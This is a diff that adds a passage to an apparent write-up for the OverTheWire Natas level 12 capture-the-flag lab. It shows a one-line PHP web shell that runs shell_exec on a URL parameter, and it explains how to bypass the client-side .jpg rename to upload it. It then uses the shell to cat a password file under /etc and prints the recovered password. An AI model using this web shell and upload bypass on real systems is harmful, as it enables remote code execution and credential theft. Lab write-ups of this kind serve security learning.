@@ -1029,3 +1029,31 @@ Choose a JPEG to upload (max 1KB):<br/>
 </body>
 </html>
 ```
+
+One-liner PHP RCE code:
+
+```php
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+```
+
+Also, the client renames the file to `.jpg`:
+
+```html
+<input
+  type="hidden"
+  name="filename"
+  value="<?php print genRandomString(); ?>.jpg"
+/>
+```
+
+This can easily be changed: it's client side...
+
+Edit the `.jpg` in `.php` and upload the PHP one-liner.
+
+We get:
+
+> The file upload/f2ce8mjyzp.php has been uploaded
+
+So we use the link passing `e` as parameter: natas12.natas.labs.overthewire.org/upload/f2ce8mjyzp.php?e=cat /etc/natas_webpass/natas13.
+
+Get: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`.
